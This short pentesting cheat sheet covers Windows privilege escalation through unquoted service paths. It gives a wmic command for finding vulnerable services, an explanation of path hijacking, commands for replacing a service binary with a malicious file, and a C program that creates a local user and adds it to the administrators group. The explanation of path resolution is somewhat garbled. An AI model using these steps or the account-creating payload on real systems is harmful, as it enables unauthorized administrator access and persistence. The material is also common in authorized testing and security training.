# Unquoted paths

## Enumeration

### wmic

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

## Exploitation

### Path hijack

Given the following path:  `C:\Program Files\a folder\app.exe` Windows will search for the following executables: `Program.exe Files.exe a.exe folder.exe app.exe` By creating an executable and inserting it in the right place it will be run with Admin or Sys privileges.

### Executable replacement

If the executable file's privileges allow overwriting it is possible to replace it with a malicious file.

```
icacls "<path to program's folder>"
cd <folder>
del /f <filename>.exe
move <path to malicious file>.exe ./<filename>.exe
```

### Boilerplate C file

```
#include <stdlib.h>
int main ()
{
    int i;
    i = system("net user <user> <pass> /add");
    i = system("net localgroup administrators <user> /add");
    return 0;
}
```
